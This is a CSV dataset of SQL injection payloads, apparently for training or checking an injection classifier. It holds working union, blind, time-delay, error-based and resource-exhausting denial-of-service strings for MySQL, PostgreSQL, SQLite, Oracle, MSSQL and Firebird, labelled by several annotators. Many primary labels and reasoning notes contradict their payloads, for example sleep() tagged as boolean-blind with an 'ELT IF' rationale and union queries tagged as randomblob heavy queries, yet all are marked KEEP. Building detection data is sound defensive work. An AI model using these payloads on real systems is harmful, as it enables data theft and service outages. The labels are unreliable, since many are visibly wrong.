payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'novq' = 'novq",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,2330,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'novq' = 'novq"
select ( case when ( 1724 = 6528 ) then 1724 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2331,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,select ( case when ( 1724 = 6528 ) then 1724 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--
"-9289 ) ) or make_set ( 5101 = 9919,9919 ) and ( ( 8977 = 8977",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2332,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-9289 ) ) or make_set ( 5101 = 9919,9919 ) and ( ( 8977 = 8977"
"1"" where 3484 = 3484 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2333,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" where 3484 = 3484 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
select ( case when ( 1434 = 1549 ) then 1434 else 1434* ( select 1434 from mysql.db ) end ) #,boolean_blind,generic,0.8,and equality for blind,KEEP,,boolean_blind,generic,2334,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 1434 = 1549 ) then 1434 else 1434* ( select 1434 from mysql.db ) end ) #
"1 ) ) as shmg where 1371 = 1371 union all select null,null,null,null,null,null,null,null,null,null#",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2335,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) as shmg where 1371 = 1371 union all select null,null,null,null,null,null,null,null,null,null#"
"1 ) as dqda where 1624 = 1624 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,firebird,0.85,Multiple rdb tables join,KEEP,,heavy_query,firebird,2336,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1 ) as dqda where 1624 = 1624 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1"" ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2337,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
select sleep ( 5 ),boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,2338,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 )
"1"" where 7796 = 7796",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2339,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 7796 = 7796"
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( 'xlvt' = 'xlvt",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2340,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( 'xlvt' = 'xlvt"
"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 'gfxr' = 'gfxr",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2341,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 'gfxr' = 'gfxr"
1 ) ) waitfor delay '0:0:5' and ( ( 1636 = 1636,boolean_blind,generic,0.8,and equality for blind,KEEP,,boolean_blind,generic,2342,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1 ) ) waitfor delay '0:0:5' and ( ( 1636 = 1636
"1'|| ( select 'sned' where 4957 = 4957 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2343,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1'|| ( select 'sned' where 4957 = 4957 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
select sleep ( 5 ) and ( ( 'ilcv' = 'ilcv,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2344,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and ( ( 'ilcv' = 'ilcv
"1 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2345,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )"
"1"" union all select null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2346,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" union all select null,null--"
"1 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # kkmw",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2347,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # kkmw"
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( '%' = '",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2348,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ( ( '%' = '"
"-7824"" ) ) ) union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2349,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7824"" ) ) ) union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--"
"-3315"" ) ) ) union all select 2457,2457,2457,2457,2457,2457--",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2350,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3315"" ) ) ) union all select 2457,2457,2457,2457,2457,2457--"
"1' ) as dwgv where 1525 = 1525 union all select null,null--",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2351,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) as dwgv where 1525 = 1525 union all select null,null--"
"1' ) ) as ydbt where 8062 = 8062 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2352,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1' ) ) as ydbt where 8062 = 8062 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"1' ) as uqkz where 8482 = 8482 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,2353,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' ) as uqkz where 8482 = 8482 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'ixzr' = 'ixzr,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2354,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'ixzr' = 'ixzr
1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'napi' like 'napi,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2355,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'napi' like 'napi
select case when 5559 = 3483 then 1 else null end--,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2356,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 5559 = 3483 then 1 else null end--
"1 ) where 2678 = 2678 union all select null,null,null,null,null,null,null,null,null#",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,2357,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) where 2678 = 2678 union all select null,null,null,null,null,null,null,null,null#"
1 ) as jvmv where 3857 = 3857 and ( 5717 = 6483 ) *6483--,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2358,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 ) as jvmv where 3857 = 3857 and ( 5717 = 6483 ) *6483--
"1%"" ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2359,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) ) union all select null,null,null,null,null,null,null--"
"-4028 ) where 3244 = 3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2360,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4028 ) where 3244 = 3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--"
"1' ) ) as usrk where 6324 = 6324 union all select null,null,null,null,null,null,null,null,null,null--",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2361,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) as usrk where 6324 = 6324 union all select null,null,null,null,null,null,null,null,null,null--"
"-7715' ) union all select 4830,4830,4830,4830,4830,4830,4830,4830--",boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,2362,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7715' ) union all select 4830,4830,4830,4830,4830,4830,4830,4830--"
"1"" ) ) rlike sleep ( 5 ) and ( ( ""fzlr"" = ""fzlr",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2363,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) rlike sleep ( 5 ) and ( ( ""fzlr"" = ""fzlr"
"-9572%"" ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2364,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-9572%"" ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """
"1%"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""%"" = """,boolean_blind,generic,0.8,and equality for blind,KEEP,,boolean_blind,generic,2365,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""%"" = """
"1"" ) union all select null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2366,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) union all select null,null,null,null,null--"
"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'moyb' = 'moyb",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,2367,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'moyb' = 'moyb"
"1' ) ) union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2368,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) union all select null,null,null,null,null,null--"
1' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'iuki' = 'iuki,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2369,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'iuki' = 'iuki
"1%"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2370,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1%"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( ""%"" = """
"1%"" ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2371,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1%"" ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'eflk' = 'eflk",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2372,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'eflk' = 'eflk"
1 ) ) as bjxd where 4299 = 4299,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2373,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as bjxd where 4299 = 4299
1' ) where 9817 = 9817,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2374,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 9817 = 9817
"1%"" ) ) ) or sleep ( 5 ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2375,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1%"" ) ) ) or sleep ( 5 ) and ( ( ( ""%"" = """
1 where 8180 = 8180 or sleep ( 5 ) #,heavy_query,firebird,0.85,Multiple domain tables join,KEEP,,heavy_query,firebird,2376,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 where 8180 = 8180 or sleep ( 5 ) #
"-8312%"" ) ) union all select 4972--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2377,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8312%"" ) ) union all select 4972--"
1'|| ( select 'pmpd' where 9803 = 9803,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2378,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'|| ( select 'pmpd' where 9803 = 9803
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'xori' like 'xori",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2379,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'xori' like 'xori"
-5432' ) as dndq where 9633 = 9633 order by 1#,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2380,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,-5432' ) as dndq where 9633 = 9633 order by 1#
1 where 8095 = 8095,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2381,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 8095 = 8095
"1"" ) where 8196 = 8196",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2382,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 8196 = 8196"
1 ) where 2010 = 2010,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2383,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 2010 = 2010
"1%"" ) ) ) and sleep ( 5 ) #",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,2384,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1%"" ) ) ) and sleep ( 5 ) #"
1%' ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2385,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1%' ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --
1' ) where 6045 = 6045,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2386,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 6045 = 6045
"1"" ) where 2702 = 2702 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2387,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" ) where 2702 = 2702 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --"
"1"" ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""ctrr"" = ""ctrr",boolean_blind,generic,0.8,and equality for blind,KEEP,,boolean_blind,generic,2388,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""ctrr"" = ""ctrr"
-8187' ) ) ) or 1698 = 2823#,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2389,boolean_blind,generic,Pattern match: 'or 1698 = 2823' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8187' ) ) ) or 1698 = 2823#
"-3347%"" or 9323 = 9323#",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2390,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-3347%"" or 9323 = 9323#"
"1%"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.8,and equality for blind,KEEP,,boolean_blind,generic,2391,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
1' ) ) as qaki where 5272 = 5272,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2392,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as qaki where 5272 = 5272
1'|| ( select 'bqhi' from dual where 7409 = 7409,boolean_blind,generic,0.8,and equality for blind,KEEP,,boolean_blind,generic,2393,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'bqhi' from dual where 7409 = 7409
"-2325 ) union all select 4692,4692,4692,4692#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2394,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2325 ) union all select 4692,4692,4692,4692#"
"-1418"" ) where 7528 = 7528 order by 1#",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2395,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"-1418"" ) where 7528 = 7528 order by 1#"
1' ) ) as tley where 3539 = 3539,heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2396,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as tley where 3539 = 3539
